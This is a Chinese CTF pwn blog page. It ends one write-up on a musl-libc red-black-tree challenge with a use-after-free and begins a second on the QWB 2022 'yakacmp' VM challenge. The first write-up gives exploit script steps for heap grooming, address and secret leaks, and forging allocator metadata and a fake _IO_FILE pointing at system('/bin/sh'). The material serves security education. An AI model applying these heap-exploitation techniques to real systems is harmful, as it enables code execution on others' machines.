<h3 id="Add函数"><a href="#Add函数" class="headerlink" title="Add函数"></a><code>Add</code>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 name_len; <span class="comment">// rsi</span></span><br><span class="line">  __int64 id; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *name_chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  chunk_info *chunk; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Id: &quot;</span>);</span><br><span class="line">  id = ReadInt();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;UserName length: &quot;</span>);</span><br><span class="line">  name_len = ReadInt();</span><br><span class="line">  name_chunk = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, name_len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;UserName: &quot;</span>);</span><br><span class="line">  ReadLine(name_chunk, name_len);</span><br><span class="line">  chunk = (chunk_info *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x38</span>uLL);</span><br><span class="line">  chunk-&gt;Id = id;</span><br><span class="line">  chunk-&gt;name_chunk = name_chunk;</span><br><span class="line">  chunk-&gt;name_len = name_len;</span><br><span class="line">  chunk-&gt;color = red;</span><br><span class="line">  <span class="keyword">if</span> ( users )</span><br><span class="line">  &#123;</span><br><span class="line">    insert(chunk, users);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    users = chunk;</span><br><span class="line">    chunk-&gt;parent = (chunk_info *)<span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">    chunk-&gt;color = black;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add ok......\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>insert</code>函数就是向红黑树中插入结点的函数。这个红黑树是按照<code>Id</code>字段进行排序的，<code>Id</code>大的结点位于左边。在<code>insert</code>函数中又调用了<code>doing</code>函数，这个函数主要是用于插入结点后的红黑树调整，其中<code>sini</code>函数的功能是树结点旋转——将参数结点与其父节点顺时针旋转（参数结点是其父节点的左子节点），<code>dext</code>函数的功能是树结点旋转——将参数结点与其父节点逆时针旋转（参数结点是其父节点的右子节点）。后面的<code>delete</code>函数包含了所有红黑树的删除操作，漏洞点不在那里，故不做分析。</p>
<h3 id="Check函数"><a href="#Check函数" class="headerlink" title="Check函数"></a><code>Check</code>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 Int; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Id: &quot;</span>);</span><br><span class="line">  Int = ReadInt();</span><br><span class="line">  v2 = find(Int, (<span class="type">unsigned</span> __int64 *)users);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, (<span class="type">const</span> <span class="type">void</span> *)v2[<span class="number">1</span>], v2[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;This user is not exists!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是检查某个用户是否存在，如果存在则会输出用户名。</p>
<h3 id="Insert函数"><a href="#Insert函数" class="headerlink" title="Insert函数"></a><code>Insert</code>函数</h3><p>本题的漏洞点在于<code>insert</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">insert</span><span class="params">(chunk_info *victim, chunk_info *base)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( base )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( victim-&gt;Id == base-&gt;Id )<span class="comment">// 如果要插入的victim的Id与base相等，则使用victim替换base，并将原来的base释放</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim-&gt;color = base-&gt;color;</span><br><span class="line">      victim-&gt;right_child = base-&gt;right_child;</span><br><span class="line">      victim-&gt;left_child = base-&gt;left_child;</span><br><span class="line">      victim-&gt;parent = base-&gt;parent;</span><br><span class="line">      <span class="keyword">if</span> ( base-&gt;right_child )</span><br><span class="line">        base-&gt;right_child-&gt;parent = victim;</span><br><span class="line">      <span class="keyword">if</span> ( base-&gt;left_child )</span><br><span class="line">        base-&gt;left_child-&gt;parent = victim;</span><br><span class="line">      <span class="keyword">if</span> ( base-&gt;parent != (chunk_info *)<span class="number">0xDEADBEEF</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( base == base-&gt;parent-&gt;right_child )</span><br><span class="line">          base-&gt;parent-&gt;right_child = victim;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          base-&gt;parent-&gt;left_child = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(base-&gt;name_chunk);</span><br><span class="line">      <span class="built_in">free</span>(base);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( victim-&gt;Id &gt;= base-&gt;Id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !base-&gt;left_child )</span><br><span class="line">      &#123;</span><br><span class="line">        victim-&gt;parent = base;</span><br><span class="line">        base-&gt;left_child = victim;</span><br><span class="line">        doing(victim);</span><br><span class="line">        <span class="keyword">if</span> ( !victim-&gt;right_child &amp;&amp; !victim-&gt;left_child )</span><br><span class="line">          base-&gt;color = black;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      base = base-&gt;left_child;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !base-&gt;right_child )</span><br><span class="line">      &#123;</span><br><span class="line">        base-&gt;right_child = victim;</span><br><span class="line">        victim-&gt;parent = base;</span><br><span class="line">        <span class="keyword">if</span> ( victim-&gt;color == red )</span><br><span class="line">          doing(victim);</span><br><span class="line">        <span class="keyword">if</span> ( !victim-&gt;right_child &amp;&amp; !victim-&gt;left_child )</span><br><span class="line">          victim-&gt;color = black;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      base = base-&gt;right_child;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意当两次插入的<code>Id</code>相等时，会将原红黑树中对应的结点替换并释放。但如果原红黑树中被替换的结点是根节点，那么表示根节点的<code>users</code>指针就并不会改变。并且，根节点的释放是在分配新结点之后，因此我们通过分配新的结点就很有可能分配到根节点的结构体本身，这样也就能够对根节点的所有字段进行任意修改了。</p>
<h2 id="2-漏洞分析与利用"><a href="#2-漏洞分析与利用" class="headerlink" title="2. 漏洞分析与利用"></a>2. 漏洞分析与利用</h2><h3 id="Step-1-获取elf加载基地址"><a href="#Step-1-获取elf加载基地址" class="headerlink" title="Step 1: 获取elf加载基地址"></a>Step 1: 获取elf加载基地址</h3><p>首先，我们需要知道应该如何才能分配到根节点chunk，这就涉及musl libc中的堆结构管理了。在musl libc中，相同大小的chunk被归为一个group中进行管理，一个group中只能存放有限个数的chunk，一个group有一个对应的meta进行管理。<strong>与glibc不同的是，musl中被释放的chunk在下一次相同申请大小的malloc时不一定会被分配，只有当group中找不到空闲的chunk时才会使用已经被释放的chunk</strong>。因此这需要我们对group进行填充。</p>
<p>本题中我们首先需要利用UAF漏洞获取到musl libc的基地址，但几乎所有的chunk都位于堆中，我们无法直接获取到libc中的地址。因此，我们需要首先泄露程序本身的加载地址。通过调试发现，存放meta等结构的内存空间紧邻程序内存，且在其上方的位置，所以我们可以首先通过泄露堆地址获取到程序加载地址：</p>
<p>在每一次<code>add</code>时，程序都会<code>calloc</code>一个大小为0x38的chunk，实际的分配大小为<code>0x40</code>。经过调试（调试方法参见<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269533.htm">资料</a>）发现，管理chunk大小为0x40的group的容量为7，即最多只能容纳7个chunk。因此我们可以考虑首先分配掉5个chunk，然后分配根节点，并使其保存name的chunk也分配到这个group中，通过<code>add</code>相同<code>Id</code>的<code>user</code>让其释放，此时只有原根节点的<code>name</code>这个chunk被释放了，因为相同<code>Id</code>的结构体占用了原根节点的结构体空间，当我们再一次<code>add</code>时，这个chunk就会被用作<code>user</code>结构体，我们通过<code>check</code>就能够读取到其中的一些指针值。</p>
<p><img src="https://img-blog.csdnimg.cn/ada7660ee3e34bf58804c88b11805ceb.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>, p64(<span class="number">9</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">check(<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
<p>由此，我们就成功获取了堆空间地址，进而得到了程序加载的基地址。</p>
<h3 id="Step-2-获取libc加载基地址"><a href="#Step-2-获取libc加载基地址" class="headerlink" title="Step 2: 获取libc加载基地址"></a>Step 2: 获取libc加载基地址</h3><p>下一步，我们就需要想办法读取到程序中保存的<code>stdout</code>的值，以获取libc的基地址。由于在正常情况下堆地址不会分配到那个地方，因此我们需要能够修改根节点的结构体本身。可行的方法是：分配掉5个chunk，之后分配根节点，根节点的<code>name</code>大小也为0x38。然后我们重新分配根节点，释放前面的一个结点。此时7个chunk中一共就有3个被释放，依次是前面的一个chunk、原根节点结构体chunk、原根节点<code>name</code>的chunk。当我们此时再一次分配一个chunk，且将<code>name</code>的大小也设置为0x38时，我们就能够将<code>name</code>的chunk申请到原根节点结构体，从而直接修改原根节点结构体中<code>name</code>指针的值。不过需要注意的是，本题中添加和删除的操作较为复杂，随意修改三个二叉树指针很可能会导致程序崩溃退出，但经过调试发现，指针的值相对于elf文件加载地址的偏移始终不变。我们在上一步已经知道了elf的加载地址，因此我们在写的时候可以不修改指针的值，而是只修改<code>name</code>指针的值，避免程序崩溃。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(stdout)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x51e0</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x50e0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x38</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(stdout)</span><br><span class="line">payload += p64(<span class="number">0x38</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5120</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5160</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x38</span>, payload)</span><br><span class="line">check(<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/7b575be7203b45b1a1d93a5164039118.png"><br>成功获取<code>stdout</code>的值。</p>
<h3 id="Step-3-获取-malloc-context结构体中的secret值"><a href="#Step-3-获取-malloc-context结构体中的secret值" class="headerlink" title="Step 3: 获取__malloc_context结构体中的secret值"></a>Step 3: 获取<code>__malloc_context</code>结构体中的<code>secret</code>值</h3><p>和第二步相同，我们如法炮制。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, p64(i + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x38</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(<span class="number">11</span> + <span class="number">0xdeadbeef00</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(__malloc_context)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x51e0</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x50e0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x38</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(__malloc_context)</span><br><span class="line">payload += p64(<span class="number">0x38</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5120</span>)</span><br><span class="line">payload += p64(elf_base + <span class="number">0x5160</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x38</span>, payload)</span><br><span class="line">check(<span class="number">11</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/7f04ef506ac34b93ad1a8d81a80a03c8.png"><br>成功获取<code>secret</code>值。</p>
<h3 id="Step-4-申请大空间，伪造meta-area-meta-group-chunk"><a href="#Step-4-申请大空间，伪造meta-area-meta-group-chunk" class="headerlink" title="Step 4: 申请大空间，伪造meta_area, meta, group, chunk"></a>Step 4: 申请大空间，伪造<code>meta_area, meta, group, chunk</code></h3><p>现在，我们已经掌握了伪造chunk并释放所需的所有数据了，因此可以开始伪造相关结构了。对于musl libc pwn来说，从meta_area这个外层结构一直伪造到chunk这个最内层结构是较为常见的操作。我们通过伪造这些结构调用到<code>dequeue</code>这个函数实现类似于glibc中unlink的利用。在本题中，我们可以通过分配一个大于0x1000的chunk来完成伪造（因为所有<code>meta_area</code>必须页对齐）。经过调试发现，当我们分配一个大chunk时，musl libc会为我们开辟一块新的空间专门用于存放，这个空间是一个 **<code>group</code>**。因此实际上开始写的地址后12比特应该为<code>0x030</code>。我们跳过本页，在下一页进行伪造。</p>
<p>经过调试发现，用于保存大chunk的group分配到的mmap空间就在libc加载地址的正下方，大小为0x5000。因此我们可以获取到这块空间的地址，并在假的<code>meta</code>结构中写入假的<code>group</code>地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">	<span class="type">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">	<span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">	<span class="type">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">int</span> pipe_pid;</span><br><span class="line">	<span class="type">long</span> lockcount;</span><br><span class="line">	<span class="type">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">	<span class="type">int</span> lbf;</span><br><span class="line">	<span class="type">void</span> *cookie;</span><br><span class="line">	<span class="type">off_t</span> off;</span><br><span class="line">	<span class="type">char</span> *getln_buf;</span><br><span class="line">	<span class="type">void</span> *mustbezero_2;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">	<span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这是musl libc中的<code>_IO_FILE</code>结构体，一般的利用方式是伪造一个假的<code>_IO_FILE</code>结构体，将<code>read</code>、<code>write</code>、<code>close</code>、<code>seek</code>函数指针覆写。注意，musl libc中没有one_gadget，因此我们只能将函数指针改写为<code>system</code>函数的地址，将<code>_IO_FILE</code>开头改写为字符串<code>/bin/sh</code>。</p>
<p>这一部分看起来容易，实际上不简单，需要我们经过反复调试才能成功unlink假的<code>meta</code>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakacmp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94yakacmp/" class="post-title-link" itemprop="url">强网杯2022 pwn 赛题解析——yakacmp</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:59" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:59+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这道题在比赛中是笔者的队友负责的，但可惜的是最后的flag差了几秒没交上。这里借用一下他的exp做一篇分析文章。</p>
<p>这是一个用C++写的vm题，内部实现了各种指令到机器码的转换功能。下面就来分块分析一下。</p>
<h1 id="Step-1-分析main函数"><a href="#Step-1-分析main函数" class="headerlink" title="Step 1: 分析main函数"></a>Step 1: 分析main函数</h1><h2 id="Segment-1"><a href="#Segment-1" class="headerlink" title="Segment 1"></a>Segment 1</h2><p><img src="https://img-blog.csdnimg.cn/70a20c787f6d40f086b9e7529625fef3.png"><br>这是加法指令识别与转换的部分代码。转换为机器码的主要流程在<code>func_add</code>函数。通过前面一部分的几个检查，我们可以知道这里要求的加法指令格式为：<code>add r?, r?</code>，其中<code>?</code>为1~4。通过对<code>func_add</code>函数中机器码的识别可知，这里的寄存器对应关系为：<code>r1=rax, r2=rbx, r3=rcx, r4=rdx</code>。注意 <strong><code>func_add</code>函数处理的是寄存器与寄存器相加的指令</strong>，而对于寄存器与立即数相加的指令，则在最后一个部分进行处理，经过调试验证可知，如果第二个操作数是立即数，则立即数不能大于10，否则会立即退出。如果立即数不大于10，那么就会相应插入对应数量的<code>inc</code>指令，这也是上图最下面的<code>func_inc</code>的功能：生成<code>inc rax/rbx/rcx/rdx</code>指令。</p>
<h2 id="Segment-2"><a href="#Segment-2" class="headerlink" title="Segment 2"></a>Segment 2</h2><p><img src="https://img-blog.csdnimg.cn/3dec0044240e4e89b2612ba5c0f0d5a8.png"><br>这一块是处理减法的相关指令，和加法几乎相同。其中<code>func_sub</code>函数用于生成寄存器与寄存器之间的减法指令，而<code>func_dec</code>用于生成寄存器和立即数之间的减法指令。这里的立即数同样不能大于10。</p>
<h2 id="Segment-3"><a href="#Segment-3" class="headerlink" title="Segment 3"></a>Segment 3</h2><p><img src="https://img-blog.csdnimg.cn/49d30bf09e7640a9b9705e9085da38c8.png"><br>这一部分是用于处理<code>chg</code>指令的代码，不过在<code>func_chg</code>中的具体实现并不是将指令转换为<code>xchg</code>的机器码，而是使用了两次<code>push</code>和两次<code>pop</code>指令来实现交换。如要实现<code>chg rax, rbx</code>，则<code>func_chg</code>函数会转换为<code>push rax ; push rbx ; pop rax ; pop rbx</code>。</p>
<h2 id="Segment-4"><a href="#Segment-4" class="headerlink" title="Segment 4"></a>Segment 4</h2><p><img src="https://img-blog.csdnimg.cn/2bfa8d1c63644996a14cf370eb811377.png"><br>这一部分只调用了<code>func_ret</code>这个函数，因此判断这是用于构造一个<code>ret</code>指令的代码片段。但在最后的部分中有一个对<code>v12</code>的判断。简单看一下<code>sub_44B0</code>函数可以知道这个函数内部的函数调用关系极为复杂，不可能通过手动静态分析的方式获取代码语义。而且在其中还存在有很多下图中的这种逻辑非常简单的函数。因此可以尝试使用动态调试的方式猜测这个函数的具体功能。我们先往下看。</p>
<p><img src="https://img-blog.csdnimg.cn/89249aca26284050847ea81a2a7da6bb.png"></p>
